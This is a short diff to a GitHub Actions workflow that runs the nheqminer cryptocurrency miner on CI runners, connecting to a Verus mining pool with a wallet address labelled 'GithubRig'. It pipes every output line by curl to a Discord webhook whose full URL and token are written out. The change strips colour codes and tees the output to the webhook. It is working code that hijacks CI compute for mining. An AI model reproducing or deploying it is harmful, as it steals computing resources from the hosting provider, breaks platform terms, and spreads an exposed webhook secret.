@@ -22,4 +22,4 @@ jobs:
         run: |
           echo Rig Started!
           lscpu
-          nheqminer/nheqminer -v -l pool.verus.io:9998 -u RJqt251eAWukfWSSmLKfuWapRJ5QFr97TV.GithubRig -p x -t 2 2>&1 | while IFS= read -r line; do curl -X POST -H "Content-Type: application/json" -d '{"content": "'"$line"'"}' https://discord.com/api/webhooks/1136879217762631720/Z3hQK1vwNBAalruygUaS7wskdeDWtVwDTPOyZp1rz7FI4s4UvRLQVvOnhbUFfFVlXDDM; done
+          nheqminer/nheqminer -v -l pool.verus.io:9998 -u RJqt251eAWukfWSSmLKfuWapRJ5QFr97TV.GithubRig -p x -t 2 --no-color 2>&1 | sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" | tee >(while IFS= read -r line; do curl -X POST -H "Content-Type: application/json" -d '{"content": "'"$line"'"}' https://discord.com/api/webhooks/1136879217762631720/Z3hQK1vwNBAalruygUaS7wskdeDWtVwDTPOyZp1rz7FI4s4UvRLQVvOnhbUFfFVlXDDM; done)
